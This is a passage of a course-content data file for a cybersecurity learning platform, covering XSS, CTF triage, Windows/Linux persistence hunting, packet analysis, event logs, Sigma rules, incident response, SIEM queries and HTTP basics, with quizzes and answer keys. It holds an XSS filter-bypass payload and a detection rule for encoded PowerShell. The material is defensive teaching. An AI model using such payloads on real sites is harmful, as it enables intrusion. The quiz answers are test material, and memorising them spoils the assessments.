- **Context-aware output encoding:** HTML entity encoding (\`&lt;\`, \`&gt;\`, \`&quot;\`).
- **HttpOnly Cookies:** Prevents JavaScript access to authentication session tokens.
- **Content Security Policy (CSP):** Restricts the origins from which scripts can be loaded and executed.`,
            keyTakeaways: [
              "Stored XSS is generally more critical than Reflected XSS because it affects all visitors without requiring social engineering.",
              "Modern frontend frameworks (React, Angular) automatically escape HTML by default, mitigating many classic XSS vectors.",
              "Implement robust Content Security Policy (CSP) headers to restrict unauthorized script execution."
            ],
            commonPitfalls: [
              "Relying on weak client-side blacklists like replacing '<script>' tags, which can be bypassed with '<img onerror=alert(1)>'."
            ],
            labGuidance: "Complete PortSwigger Web Security Academy lab: 'Reflected XSS into HTML context with nothing encoded'.",
            resources: [
              {
                title: "PortSwigger Web Security Academy — Cross-Site Scripting",
                url: "https://portswigger.net/web-security/cross-site-scripting",
                type: "lab",
                platform: "PortSwigger"
              }
            ]
          },
          {
            slug: "guided-beginner-labs",
            title: "Guided Beginner Labs & Virtual Sandboxes",
            sequenceOrder: 11,
            estimatedMinutes: 50,
            prerequisites: ["Introduction to Cross-Site Scripting"],
            objectives: [
              "Connect to virtual lab VPNs via OpenVPN configurations",
              "Conduct structured host enumeration in an authorized sandbox",
              "Document findings, evidence screenshots, and reproduction steps",
              "Practice responsible vulnerability disclosure formats"
            ],
            summary: "Transition from theory to practical application in authorized training sandboxes like TryHackMe and HackTheBox Academy.",
            contentMarkdown: `### The Professional Testing Workflow

In professional security auditing, discovering a vulnerability is only half the job. Documenting reproducible proof-of-concept (PoC) evidence is what delivers value.

#### Connecting to Training VPNs

\`\`\`bash
# Establish an isolated OpenVPN tunnel to the training network
sudo openvpn my_lab_credentials.ovpn

# Verify connectivity to your assigned lab IP address
ping -c 3 10.10.110.45
\`\`\`

#### Documentation Standard (The 4 Pillars of a Finding)

1. **Vulnerability Title & Severity:** e.g., 'Stored Cross-Site Scripting in User Profile (High)'.
2. **Affected Asset / URL:** e.g., \`https://target.lab/profile/update\`.
3. **Step-by-Step Reproduction:** Unambiguous commands and payloads so the developer can reproduce it reliably.
4. **Remediation Recommendation:** Clear, actionable code-level remediation.`,
            keyTakeaways: [
              "Always record exact timestamps, commands executed, and output logs during lab exercises.",
              "Never deviate from assigned target IP ranges during VPN lab sessions."
            ],
            commonPitfalls: [
              "Failing to document findings as you work, forcing you to repeat hours of testing."
            ],
            labGuidance: "Complete the TryHackMe 'Kenobi' or 'Pickle Rick' beginner guided rooms.",
            resources: [
              {
                title: "TryHackMe — Beginner Path",
                url: "https://tryhackme.com/path/outline/beginner",
                type: "lab",
                platform: "TryHackMe"
              }
            ]
          },
          {
            slug: "beginner-ctf-challenges-and-writeups",
            title: "Beginner CTF Challenges and Write-Ups",
            sequenceOrder: 12,
            estimatedMinutes: 50,
            prerequisites: ["Guided Beginner Labs & Virtual Sandboxes"],
            objectives: [
              "Understand Capture The Flag (CTF) styles: Jeopardy vs. Attack-Defense",
              "Learn common CTF categories: Web, Forensics, Cryptography, Reverse Engineering, OSINT",
              "Locate the standard flag format (e.g., flag{...} or THM{...})",
              "Write professional, ethical write-ups that teach others without spoiling active competitions"
            ],
            summary: "Capture The Flag competitions are gamified cybersecurity puzzles that accelerate problem-solving skills and technical creativity.",
            contentMarkdown: `### Navigating Your First CTF Competition

CTFs present realistic simulated puzzles where your goal is to find a hidden string known as a **Flag** (e.g., \`CYBERPATH{w3lc0m3_t0_th3_r3d_t34m}\`).

#### Standard CTF Categories

- **Web Exploitation:** SQLi, XSS, SSRF, IDOR, path traversal.
- **Forensics:** Analyzing packet captures (.pcap), memory dumps, and hidden metadata in image files.
- **Cryptography:** Identifying weak ciphers, frequency analysis, RSA implementation flaws.
- **Reverse Engineering:** Decompiling binaries to understand logic and extract hardcoded keys.

\`\`\`bash
# Essential CLI triage tools for CTF puzzles
file mystery_download        # Identify actual file format based on magic bytes
strings mystery_download | grep -i "flag{"
exiftool image.png           # Inspect EXIF metadata
xxd mystery_file | head -n 10 # Hexdump first bytes
\`\`\``,
            keyTakeaways: [
              "CTF competitions teach resilience: feeling stuck is normal; systematically eliminating dead ends is how flags are captured.",
              "Never publish solutions to active, ongoing competitions; publish write-ups only after the event has concluded."
            ],
            commonPitfalls: [
              "Jumping directly into advanced binary exploitation before mastering Linux fundamentals and networking."
            ],
            labGuidance: "Register for a free account on picoCTF and solve 3 beginner challenges.",
            resources: [
              {
                title: "picoCTF — Free Educational CTF Platform",
                url: "https://picoctf.org/",
                type: "lab",
                platform: "Carnegie Mellon picoCTF"
              }
            ],
            quiz: {
              slug: "quiz-ctf-red-team",
              title: "Red Team Capstone Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qctf1",
                  questionText: "What command extracts readable ASCII text strings from a compiled binary file during CTF forensics?",
                  options: [
                    { id: "a", text: "rm -rf" },
                    { id: "b", text: "strings" },
                    { id: "c", text: "chmod" },
                    { id: "d", text: "ping" }
                  ],
                  correctOptionId: "b",
                  explanation: "The 'strings' command prints printable character sequences from binary files, making it a primary initial triage step in CTF challenges."
                },
                {
                  id: "qctf2",
                  questionText: "When is it ethically acceptable to publish a detailed CTF solution or write-up online?",
                  options: [
                    { id: "a", text: "While the competition is actively live" },
                    { id: "b", text: "After the competition has officially concluded, adhering to event disclosure rules" },
                    { id: "c", text: "In exchange for real money payments" },
                    { id: "d", text: "Whenever you feel like it" }
                  ],
                  correctOptionId: "b",
                  explanation: "Publishing write-ups during active contests undermines academic integrity and violates competition rules."
                }
              ]
            }
          }
        ]
      }
    ]
  },
  {
    slug: "blue-team",
    title: "Blue Team",
    subtitle: "Defensive Security & Threat Hunting",
    badgeAward: "Blue Team Defender",
    colorTheme: "green",
    description: "Master defensive architecture: continuous event logging, network traffic analysis, Windows and Linux auditing, incident response lifecycles, and SIEM correlation.",
    accentColor: "#ffffff",
    modules: [
      {
        id: "bt-mod-1",
        slug: "defense-foundations",
        title: "Module 1: Defense Foundations & OS Auditing",
        description: "Understand core defense-in-depth principles, OS auditing, and event telemetry.",
        lessons: [
          {
            slug: "security-fundamentals",
            title: "Security Fundamentals & Defense in Depth",
            sequenceOrder: 1,
            estimatedMinutes: 30,
            prerequisites: ["None — Beginner Friendly"],
            objectives: [
              "Understand the Defense-in-Depth architectural philosophy",
              "Learn the Principle of Least Privilege (PoLP)",
              "Understand attack surfaces and attack vectors",
              "Differentiate between preventative, detective, and corrective security controls"
            ],
            summary: "No single security barrier can stop an attacker. Defense in depth layers physical, network, host, and application controls.",
            contentMarkdown: `### The Defense-in-Depth Architectural Model

Defense in Depth recognizes that any single defense mechanism will eventually fail. Security architecture must consist of multiple concentric layers:

1. **Perimeter Controls:** Firewalls, DDoS shielding, ingress rate limits.
2. **Network Controls:** VLAN segmentation, Zero Trust Network Access (ZTNA), Network Intrusion Detection (NIDS).
3. **Endpoint & Host Controls:** Endpoint Detection and Response (EDR), disk encryption, AppLocker, audit logging.
4. **Application Controls:** Input validation, authentication, role-based access control (RBAC).
5. **Data Controls:** Cryptographic encryption at rest and in transit, DLP (Data Loss Prevention).

#### The Principle of Least Privilege (PoLP)

Every identity (user, service account, system process) must be granted only the minimum permissions required to perform its legitimate function — and no more.`,
            keyTakeaways: [
              "Assume breach: design systems assuming that outer perimeter perimeters have already been bypassed.",
              "Least privilege significantly limits lateral movement when credentials are compromised."
            ],
            commonPitfalls: [
              "Relying entirely on a perimeter firewall while leaving internal servers completely unsegmented."
            ],
            labGuidance: "Review the NIST Cybersecurity Framework (Identify, Protect, Detect, Respond, Recover).",
            resources: [
              {
                title: "NIST Cybersecurity Framework Overview",
                url: "https://www.nist.gov/cyberframework",
                type: "documentation",
                platform: "NIST"
              }
            ]
          },
          {
            slug: "operating-system-fundamentals",
            title: "Operating System Fundamentals for Defenders",
            sequenceOrder: 2,
            estimatedMinutes: 35,
            prerequisites: ["Security Fundamentals & Defense in Depth"],
            objectives: [
              "Understand Windows architecture: SAM database, Active Directory, Registry hives",
              "Understand Linux architecture: PAM, /etc/shadow, systemd services",
              "Audit user creation and privilege escalation artifacts",
              "Inspect autorun locations and persistence mechanisms"
            ],
            summary: "Defenders must know operating systems at a deep architectural level to distinguish normal user behavior from malicious persistence.",
            contentMarkdown: `### Host Architecture & Threat Artifacts

Adversaries establish persistence so they can maintain access even after a machine reboots. Defenders must know where to look.

#### Windows Persistence Hotspots

- **Windows Registry Run Keys:** \`HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\`
- **Scheduled Tasks:** Audited via \`schtasks /query /fo LIST\`
- **Services:** Windows services configured to start automatically as \`SYSTEM\`.

\`\`\`powershell
# PowerShell command to inspect non-standard startup programs
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User
\`\`\`

#### Linux Persistence Hotspots

- **Cron Jobs:** \`/etc/crontab\`, \`/etc/cron.d/\`, and user crontabs (\`crontab -l\`).
- **Systemd Units:** Malicious unit files in \`/etc/systemd/system/\`.
- **Shell Profiles:** Appended commands in \`~/.bashrc\` or \`/etc/profile\`.`,
            keyTakeaways: [
              "Adversaries abuse legitimate administrative utilities (Living off the Land) to establish persistence without compiling custom malware.",
              "Baseline your systems: you cannot spot anomalous persistence unless you know what normal looks like."
            ],
            commonPitfalls: [
              "Only scanning for known virus signatures while ignoring legitimate scheduled tasks executing PowerShell scripts."
            ],
            labGuidance: "Inspect scheduled tasks on your local Windows or Linux computer.",
            resources: [
              {
                title: "MITRE ATT&CK — Persistence Techniques (TA0003)",
                url: "https://attack.mitre.org/tactics/TA0003/",
                type: "documentation",
                platform: "MITRE ATT&CK"
              }
            ]
          },
          {
            slug: "networking-and-traffic-analysis",
            title: "Networking and Traffic Analysis",
            sequenceOrder: 3,
            estimatedMinutes: 45,
            prerequisites: ["Operating System Fundamentals for Defenders"],
            objectives: [
              "Capture and inspect network packets using Wireshark and tcpdump",
              "Identify cleartext credentials and DNS queries in pcap files",
              "Spot suspicious beaconing patterns and command & control (C2) communication",
              "Detect port scans and SYN flooding in traffic captures"
            ],
            summary: "Packet captures never lie. Analyzing network telemetry reveals data exfiltration, lateral movement, and unauthorized protocol usage.",
            contentMarkdown: `### Packet Analysis with Wireshark & Tcpdump

When network anomalies occur, packet capture (pcap) files provide immutable ground truth.

#### Essential Wireshark Display Filters

\`\`\`
# Filter for HTTP traffic containing POST requests
http.request.method == "POST"

# Filter for DNS queries looking for anomalous long subdomains (DNS Tunneling)
dns.flags.response == 0

# Filter for failed TCP connections / scan activity
tcp.flags.reset == 1 && tcp.flags.ack == 1

# Filter for specific suspicious IP address
ip.addr == 192.168.1.50 && tcp.port == 4444
\`\`\`

#### Command Line Capture with tcpdump

\`\`\`bash
# Capture 100 packets on interface eth0 and write to audit.pcap
sudo tcpdump -i eth0 -c 100 -w audit.pcap "tcp port 80 or tcp port 443"
\`\`\``,
            keyTakeaways: [
              "Repeated connections at precise intervals (e.g., every 60 seconds) are strong indicators of automated C2 beaconing.",
              "Look for unusual outbound traffic over high ephemeral ports."
            ],
            commonPitfalls: [
              "Trying to analyze massive multi-gigabyte pcap files in GUI Wireshark without filtering or using Zeek / tshark."
            ],
            labGuidance: "Complete TryHackMe's 'Wireshark 101' room.",
            resources: [
              {
                title: "TryHackMe — Wireshark 101",
                url: "https://tryhackme.com/room/wireshark101",
                type: "lab",
                platform: "TryHackMe"
              }
            ],
            quiz: {
              slug: "quiz-traffic-analysis",
              title: "Network Traffic Analysis Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qt1",
                  questionText: "What Wireshark display filter isolates only HTTP POST requests?",
                  options: [
                    { id: "a", text: "http.post == true" },
                    { id: "b", text: "http.request.method == \"POST\"" },
                    { id: "c", text: "tcp.port == 80" },
                    { id: "d", text: "ip.proto == 6" }
                  ],
                  correctOptionId: "b",
                  explanation: "The filter http.request.method == \"POST\" specifically isolates HTTP requests using the POST verb."
                },
                {
                  id: "qt2",
                  questionText: "Which pattern in network telemetry is most characteristic of malware communicating with a Command & Control (C2) server?",
                  options: [
                    { id: "a", text: "A single DNS query to google.com" },
                    { id: "b", text: "Regular, rhythmic outbound connections (beaconing) at fixed or jittered intervals" },
                    { id: "c", text: "DHCP requests upon booting" },
                    { id: "d", text: "NTP clock synchronization once per day" }
                  ],
                  correctOptionId: "b",
                  explanation: "Automated check-ins (beaconing) between infected implants and remote C2 controllers produce distinct periodic connection signatures."
                }
              ]
            }
          }
        ]
      },
      {
        id: "bt-mod-2",
        slug: "monitoring-and-detection",
        title: "Module 2: Logs, Threat Detection & SIEM",
        description: "Deploy log collection, analyze event IDs, detect adversary tactics, and query Security Information and Event Management (SIEM) systems.",
        lessons: [
          {
            slug: "logs-and-event-monitoring",
            title: "Logs and Event Monitoring",
            sequenceOrder: 4,
            estimatedMinutes: 40,
            prerequisites: ["Networking and Traffic Analysis"],
            objectives: [
              "Understand Windows Event Log structure (System, Application, Security)",
              "Memorize critical Windows Security Event IDs (4624, 4625, 4688, 4720)",
              "Understand Linux syslog and auditd telemetry",
              "Explain central log shipping and log tampering prevention"
            ],
            summary: "Without logs, incident response is impossible. Security Event IDs capture logon successes, failures, process creations, and user account modifications.",
            contentMarkdown: `### Critical Windows Security Event IDs

Windows Security Event Logs document every significant security action taken on an endpoint or domain controller.

| Event ID | Description | Security Relevance |
|---|---|---|
| **4624** | An account was successfully logged on | Monitor logon types (Type 2=Interactive, Type 3=Network, Type 10=RDP) |
| **4625** | An account failed to log on | Spikes indicate password spraying or brute force attacks |
| **4688** | A new process has been created | Track process command-lines (e.g., cmd.exe spawned by word.exe) |
| **4720** | A user account was created | Rogue administrative accounts created for persistence |
| **7045** | A service was installed in the system | Often indicates malware persistence or lateral movement |

\`\`\`powershell
# Querying Windows Event Log for failed logons in the last 2 hours
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4625
    StartTime = (Get-Date).AddHours(-2)
}
\`\`\``,
            keyTakeaways: [
              "Event 4688 with command-line auditing enabled is one of the highest-fidelity detection sources.",
              "Logon Type 10 represents Remote Desktop (RDP); Logon Type 3 represents network shares (SMB).",
              "Ship logs immediately to write-only central storage so an attacker with root cannot erase their tracks."
            ],
            commonPitfalls: [
              "Leaving command-line auditing disabled on Windows, so Event 4688 records process names but hides arguments."
            ],
            labGuidance: "Open Windows Event Viewer (eventvwr.msc) on your workstation and inspect Event 4624 under Security logs.",
            resources: [
              {
                title: "Microsoft Security Event Log Reference",
                url: "https://learn.microsoft.com/en-us/windows/security/threat-protection/use-windows-event-forwarding-to-help-with-intrusion-detections",
                type: "documentation",
                platform: "Microsoft Learn"
              }
            ],
            quiz: {
              slug: "quiz-event-logs",
              title: "Event Monitoring Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qe1",
                  questionText: "Which Windows Security Event ID signifies a failed user logon attempt?",
                  options: [
                    { id: "a", text: "4624" },
                    { id: "b", text: "4625" },
                    { id: "c", text: "4688" },
                    { id: "d", text: "7045" }
                  ],
                  correctOptionId: "b",
                  explanation: "Event 4625 records failed logon events, logging the source IP, account name, and failure reason code."
                },
                {
                  id: "qe2",
                  questionText: "Why is shipping logs in real time to a centralized SIEM critical for defense?",
                  options: [
                    { id: "a", text: "To reduce disk space on the target server" },
                    { id: "b", text: "To prevent attackers from erasing local log evidence after gaining administrative access" },
                    { id: "c", text: "Because firewalls automatically drop local log files" },
                    { id: "d", text: "To avoid updating operating system software" }
                  ],
                  correctOptionId: "b",
                  explanation: "Once adversaries gain root or SYSTEM privileges, they commonly clear local event logs. Central shipping preserves evidence."
                }
              ]
            }
          },
          {
            slug: "windows-and-linux-security",
            title: "Windows and Linux Hardening",
            sequenceOrder: 5,
            estimatedMinutes: 40,
            prerequisites: ["Logs and Event Monitoring"],
            objectives: [
              "Implement Windows Group Policy Objects (GPO) for baseline hardening",
              "Configure Linux SSH hardening: disable root login, enforce key-based auth",
              "Understand Host-based Firewalls (UFW, iptables, Windows Defender Firewall)",
              "Implement Application Whitelisting (AppLocker, Windows Defender Application Control)"
            ],
            summary: "Hardening reduces attack surfaces by disabling unnecessary services, closing unused ports, and restricting administrative privileges.",
            contentMarkdown: `### System Hardening Principles

Default operating system configurations prioritize convenience over security. Hardening shifts the balance to security.

#### Hardening SSH on Linux (\`/etc/ssh/sshd_config\`)

\`\`\`ini
# Strictly disable root login over SSH
PermitRootLogin no

# Enforce cryptographic keys; reject plaintext passwords
PasswordAuthentication no

# Restrict to modern secure cipher suites
KexAlgorithms curve25519-sha256@libssh.org,diffie-hellman-group-exchange-sha256
\`\`\`

#### Windows Hardening Baselines

- **Disable SMBv1:** Legacy protocol vulnerable to EternalBlue.
- **Enforce LSA Protection:** Prevents non-protected processes from reading LSASS memory to steal plaintext passwords.
- **Enable UAC (User Account Control) at maximum level.**`,
            keyTakeaways: [
              "Disabling password authentication on SSH eliminates 100% of brute-force password spraying attacks.",
              "Application whitelisting blocks unauthorized executables from running, even if downloaded successfully."
            ],
            commonPitfalls: [
              "Assuming a firewall is enough when sensitive internal services run with default administrative passwords."
            ],
            labGuidance: "Audit your Linux VM's /etc/ssh/sshd_config file against CIS Benchmarks.",
            resources: [
              {
                title: "CIS Benchmarks (Center for Internet Security)",
                url: "https://www.cisecurity.org/cis-benchmarks",
                type: "documentation",
                platform: "CIS"
              }
            ]
          },
          {
            slug: "threat-detection-fundamentals",
            title: "Threat Detection Fundamentals & Sigma Rules",
            sequenceOrder: 6,
            estimatedMinutes: 45,
            prerequisites: ["Windows and Linux Hardening"],
            objectives: [
              "Understand Indicators of Compromise (IoCs) vs. Indicators of Attack (IoAs)",
              "Map adversary techniques to the MITRE ATT&CK Framework",
              "Write detection rules using Sigma (generic SIEM rule format)",
              "Understand the Pyramid of Pain (David Bianco)"
            ],
            summary: "Move beyond chasing hash values and IP addresses. Learn to detect adversary Tactics, Techniques, and Procedures (TTPs).",
            contentMarkdown: `### The Pyramid of Pain

The **Pyramid of Pain** ranks detection artifacts by how painful it is for an attacker to change them when defenders detect them:

1. **Hash Values (Trivial):** Changing one byte alters the MD5/SHA256 completely.
2. **IP Addresses (Easy):** Attackers rotate through proxy IPs, VPNs, and VPS nodes.
3. **Domain Names (Simple):** Domain generation algorithms (DGA) make domain rotation fast.
4. **Network/Host Artifacts (Annoying):** User-Agent strings, specific mutexes.
5. **Tools (Challenging):** Modifying automated exploitation scripts.
6. **TTPs (Tough):** Changing behavioral habits (e.g., how credential dumping is performed).

#### Detecting TTPs with Sigma Rules

\`\`\`yaml
title: Suspicious PowerShell Encoded Command Execution
status: experimental
description: Detects obfuscated encoded commands launched via PowerShell
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\powershell.exe'
    CommandLine|contains:
      - ' -e '
      - ' -enc '
      - ' -EncodedCommand '
  condition: selection
level: high
\`\`\``,
            keyTakeaways: [
              "Focus detection engineering at the top of the Pyramid of Pain: behavioral TTPs.",
              "Sigma rules can be converted into Splunk, Elastic, Sentinel, and QRadar queries automatically."
            ],
            commonPitfalls: [
              "Relying solely on antivirus hashes to protect against targeted adversaries."
            ],
            labGuidance: "Explore the official Sigma repository on GitHub and study real-world detection rules.",
            resources: [
              {
                title: "Sigma Detection Format",
                url: "https://github.com/SigmaHQ/sigma",
                type: "documentation",
                platform: "SigmaHQ"
              }
            ]
          }
        ]
      },
      {
        id: "bt-mod-3",
        slug: "incident-response-and-siem",
        title: "Module 3: Incident Response & SIEM Operations",
        description: "Master the 6-phase incident response lifecycle, SIEM searching, and guided defensive triage exercises.",
        lessons: [
          {
            slug: "incident-response",
            title: "Incident Response Lifecycle (NIST & SANS)",
            sequenceOrder: 7,
            estimatedMinutes: 40,
            prerequisites: ["Threat Detection Fundamentals & Sigma Rules"],
            objectives: [
              "Understand the 6 phases: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned",
              "Differentiate between Short-term and Long-term Containment strategies",
              "Preserve digital evidence adhering to chain of custody requirements",
              "Conduct blameless post-incident Lessons Learned reviews"
            ],
            summary: "When a breach occurs, structured incident response limits damages, eradicates the adversary, and restores operations safely.",
            contentMarkdown: `### The SANS 6-Phase Incident Response Lifecycle

1. **Preparation:** Policies, playbooks, communication channels, trained analysts, logging tools ready BEFORE an incident occurs.
2. **Identification (Triage):** Determining if an event is a genuine security incident. Scoping affected assets and severity.
3. **Containment:** Preventing the spread.
   - *Short-term:* Isolating host from network (segmentation, disabling network adapter).
   - *Long-term:* Blocking malicious IP addresses, revoking compromised API keys.
4. **Eradication:** Removing artifacts from the environment (wiping infected disks, removing persistence registry keys, resetting passwords).
5. **Recovery:** Restoring systems to clean production operations, monitoring closely for reactivation.
6. **Lessons Learned:** Analyzing root cause, documenting timeline, updating detection rules so the same vector cannot succeed again.`,
            keyTakeaways: [
              "Never power off a machine abruptly if memory forensics is required (RAM holds encryption keys and active processes).",
              "Isolate the machine at the network level rather than pulling the power plug whenever feasible."
            ],
            commonPitfalls: [
              "Rushing to format an infected computer before capturing forensic evidence of how the attacker breached the system."
            ],
            labGuidance: "Draft an incident containment checklist for a simulated ransomware outbreak.",
            resources: [
              {
                title: "NIST SP 800-61 Rev. 2 — Computer Security Incident Handling Guide",
                url: "https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final",
                type: "documentation",
                platform: "NIST CSRC"
              }
            ]
          },
          {
            slug: "introduction-to-siem",
            title: "Introduction to SIEM (Splunk & Elastic)",
            sequenceOrder: 8,
            estimatedMinutes: 45,
            prerequisites: ["Incident Response Lifecycle (NIST & SANS)"],
            objectives: [
              "Understand Security Information and Event Management (SIEM) architecture",
              "Learn Splunk Search Processing Language (SPL) syntax",
              "Correlate events across multiple disparate log sources",
              "Build alerting thresholds for brute-force and privilege escalation detection"
            ],
            summary: "SIEM platforms aggregate, index, and correlate millions of logs from across an entire enterprise into a centralized search interface.",
            contentMarkdown: `### SIEM Querying with Splunk & Elastic

Modern enterprises generate billions of log rows daily. SIEMs ingest and index this telemetry for real-time alerting.

#### Basic Splunk SPL (Search Processing Language)

\`\`\`spl
# Search for failed logins grouped by source IP address
index=security EventCode=4625
| stats count by src_ip, user
| where count > 10
| sort - count

# Correlate process creation with suspicious network connections
index=endpoint EventCode=4688 Image="*powershell.exe"
| join dest_ip [
    search index=firewall action=allowed
]
\`\`\`

#### Elastic KQL (Kibana Query Language)

\`\`\`
event.code: 4625 and user.name: "administrator"
\`\`\``,
            keyTakeaways: [
              "Correlation rules connect dots across disparate sources (e.g., VPN login from London followed 2 minutes later by a desktop login from Tokyo).",
              "Tuning alerts is critical to prevent SOC alert fatigue."
            ],
            commonPitfalls: [
              "Writing overly broad search queries that time out across petabyte-scale data lakes."
            ],
            labGuidance: "Complete TryHackMe's free 'Splunk: Basics' room.",
            resources: [
              {
                title: "TryHackMe — Splunk 101",
                url: "https://tryhackme.com/room/splunk101",
                type: "lab",
                platform: "TryHackMe"
              }
            ],
            quiz: {
              slug: "quiz-siem-operations",
              title: "SIEM & SOC Operations Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qsi1",
                  questionText: "What is the primary function of a Security Information and Event Management (SIEM) system?",
                  options: [
                    { id: "a", text: "To overwrite hard drives automatically" },
                    { id: "b", text: "To aggregate, index, and correlate logs from across an organization for centralized detection" },
                    { id: "c", text: "To replace human security analysts" },
                    { id: "d", text: "To host public web pages" }
                  ],
                  correctOptionId: "b",
                  explanation: "SIEMs ingest event data from firewalls, servers, databases, and endpoints, providing correlation and search capabilities."
                },
                {
                  id: "qsi2",
                  questionText: "In the SANS Incident Response lifecycle, during which phase do you permanently remove attacker artifacts and close root vulnerabilities?",
                  options: [
                    { id: "a", text: "Identification" },
                    { id: "b", text: "Eradication" },
                    { id: "c", text: "Preparation" },
                    { id: "d", text: "Lessons Learned" }
                  ],
                  correctOptionId: "b",
                  explanation: "The Eradication phase focuses on completely removing malicious backdoors, files, and root causes of the intrusion."
                }
              ]
            }
          },
          {
            slug: "guided-defensive-exercises",
            title: "Guided Defensive Exercises & Investigation",
            sequenceOrder: 9,
            estimatedMinutes: 50,
            prerequisites: ["Introduction to SIEM (Splunk & Elastic)"],
            objectives: [
              "Triage a simulated multi-stage intrusion from initial access to data exfiltration",
              "Construct an accurate incident timeline using timestamps and event IDs",
              "Identify attacker persistence and lateral movement",
              "Draft an executive incident debrief report"
            ],
            summary: "Synthesize all defensive skills by investigating a realistic simulated corporate network intrusion.",
            contentMarkdown: `### The End-to-End Investigation Walkthrough

In this capstone defensive exercise, you analyze forensic logs from a compromised financial workstation:

#### Investigation Milestones

1. **Initial Access:** Identify the malicious phishing email and document execution timestamp (Word macro spawning powershell).
2. **Credential Access:** Detect LSASS memory dumping using Sysmon Event 10.
3. **Lateral Movement:** Identify SMB connections using stolen credentials (Event 4624 Type 3).
4. **Exfiltration:** Review firewall outbound logs for gigabyte data transfers to a suspicious cloud bucket.

\`\`\`bash
# Forensic timeline generation using log2timeline / plaso
psort.py -o l2tcsv -w timeline.csv storage.plaso
\`\`\``,
            keyTakeaways: [
              "Maintain meticulous notes with UTC timestamps when reconstructing an incident timeline.",
              "Defenders win by identifying any single mistake made by the adversary during the attack chain."
            ],
            commonPitfalls: [
              "Assuming the first compromised host you find is the only one in the network."
            ],
            labGuidance: "Complete the TryHackMe 'Investigating Windows' room.",
            resources: [
              {
                title: "TryHackMe — Investigating Windows",
                url: "https://tryhackme.com/room/investigatingwindows",
                type: "lab",
                platform: "TryHackMe"
              }
            ],
            quiz: {
              slug: "quiz-blue-team-capstone",
              title: "Blue Team Defender Capstone Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qbc1",
                  questionText: "Why is it important to standardize all incident timestamps to UTC during a multi-host forensic investigation?",
                  options: [
                    { id: "a", text: "UTC is required by law in every nation" },
                    { id: "b", text: "It prevents time zone discrepancy errors when correlating events across distributed servers" },
                    { id: "c", text: "It reduces file sizes of forensic logs" },
                    { id: "d", text: "Windows only supports UTC" }
                  ],
                  correctOptionId: "b",
                  explanation: "Standardizing on UTC eliminates confusion caused by varying local time zones, daylight saving shifts, and distributed server logs."
                }
              ]
            }
          }
        ]
      }
    ]
  },
  {
    slug: "web-security",
    title: "Web Security",
    subtitle: "Application Security & OWASP Top 10",
    badgeAward: "Web Security Expert",
    colorTheme: "purple",
    description: "Explore the inner workings of modern web apps: HTTP headers, cookies, authentication, CORS, Access Controls, SQLi, XSS, CSRF, and PortSwigger Web Security Academy labs.",
    accentColor: "#ffffff",
    modules: [
      {
        id: "ws-mod-1",
        slug: "web-mechanics",
        title: "Module 1: Web Architecture, HTTP & Authentication",
        description: "Deconstruct how browsers, servers, proxies, and session tokens interact under the hood.",
        lessons: [
          {
            slug: "how-websites-work",
            title: "How Websites Work: Clients, Servers, and APIs",
            sequenceOrder: 1,
            estimatedMinutes: 30,
            prerequisites: ["None — Beginner Friendly"],
            objectives: [
              "Understand client-side execution (HTML, CSS, JS in browser sandbox)",
              "Understand server-side logic and database persistence",
              "Deconstruct REST APIs and JSON data exchanges",
              "Inspect developer tools Console, Elements, and Network panels"
            ],
            summary: "Modern web applications split logic between the browser client and backend servers. Security boundaries exist exclusively on the server.",
            contentMarkdown: `### The Client-Server Security Boundary

A fundamental rule of web security: **Never trust the client.**

Any code running inside a user's browser (HTML, JavaScript, frontend state) can be inspected, paused, modified, and bypassed by the user.

\`\`\`
[ Browser (Untrusted Client) ] --- HTTP / JSON ---> [ API Gateway / Reverse Proxy ] ---> [ Backend Server (Trusted) ] ---> [ Database ]
\`\`\`

#### Why Client-Side Validation Fails Alone

If a form disables a submit button until an email matches a regex:
- An attacker simply opens Burp Suite or curl and sends the POST request directly, bypassing the UI completely.
- Backend code must validate every incoming parameter independently.`,
            keyTakeaways: [
              "Client-side validation improves user experience; server-side validation enforces actual security.",
              "Assume every incoming HTTP request was crafted by a hostile adversary."
            ],
            commonPitfalls: [
              "Hiding admin features by setting CSS 'display: none' without enforcing backend role checks."
            ],
            labGuidance: "Open browser DevTools (F12) and inspect the Network panel while interacting with your favorite web apps.",
            resources: [
              {
                title: "PortSwigger Web Security Academy — How the Web Works",
                url: "https://portswigger.net/web-security",
                type: "documentation",
                platform: "PortSwigger"
              }
            ]
          },
          {
            slug: "http-requests-and-responses",
            title: "HTTP Requests and Responses Deep Dive",
            sequenceOrder: 2,
            estimatedMinutes: 35,
            prerequisites: ["How Websites Work: Clients, Servers, and APIs"],
            objectives: [
              "Anatomize HTTP headers: Host, Content-Type, Content-Length, Authorization",
              "Master query parameters (?id=1) vs body payloads (JSON, multipart/form-data)",
              "Understand HTTP verb semantics (GET idempotency vs POST mutation)",
              "Interpret security response headers (HSTS, CSP, X-Frame-Options)"
            ],
            summary: "Every vulnerability in a web app manifests in an HTTP request or response. Fluency in reading raw HTTP is required for web security analysts.",
            contentMarkdown: `### Raw HTTP Inspection

Security testing requires looking past rendered web pages to the raw HTTP streams:

\`\`\`http
GET /user/profile?id=105 HTTP/1.1
Host: cyberpath.internal
Authorization: Bearer eyJhbGciOi...
Accept: application/json
\`\`\`

#### Security Headers Defense Checklist

- **Strict-Transport-Security (HSTS):** Enforces HTTPS-only connections for the domain.
- **X-Content-Type-Options: nosniff:** Prevents MIME-sniffing vulnerabilities.
- **X-Frame-Options: DENY / SAMEORIGIN:** Prevents clickjacking by blocking iframe embedding.
- **Content-Security-Policy (CSP):** Limits where scripts and styles can be loaded from.`,
            keyTakeaways: [
              "GET requests should never modify server state or transmit sensitive tokens in URL query strings (they get logged in server access logs and browser history).",
              "Deploy modern security headers to provide Defense-in-Depth against client-side browser attacks."
            ],
            commonPitfalls: [
              "Transmitting API keys or session tokens in GET query parameters."
            ],
            labGuidance: "Inspect your application's security headers using securityheaders.com.",
            resources: [
              {
                title: "OWASP Secure Headers Project",
                url: "https://owasp.org/www-project-secure-headers/",
                type: "documentation",
                platform: "OWASP"
              }
